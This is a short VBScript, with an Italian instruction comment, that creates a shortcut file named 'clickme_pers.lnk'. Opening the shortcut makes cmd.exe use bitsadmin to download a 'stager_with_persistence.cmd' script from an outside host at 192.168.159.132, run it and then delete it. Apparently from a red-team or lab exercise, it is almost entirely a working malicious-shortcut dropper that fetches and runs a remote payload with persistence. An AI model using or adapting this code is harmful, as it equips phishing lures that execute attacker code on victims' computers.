'Modificare "COMANDO-BITSADMIN" con il comando per lanciare BITSAdmin per scaricare stager.cmd in C:\Users\Public\Libraries

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "clickme_pers.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Windows\System32\cmd.exe"
oLink.Arguments = "/c bitsadmin /transfer mystager /priority FOREGROUND http://192.168.159.132/stager_with_persistence.cmd C:\Users\Public\Libraries\stager_with_persistence.cmd & call C:\Users\Public\Libraries\stager_with_persistence.cmd & del C:\Users\Public\Libraries\stager_with_persistence.cmd"
oLink.Save
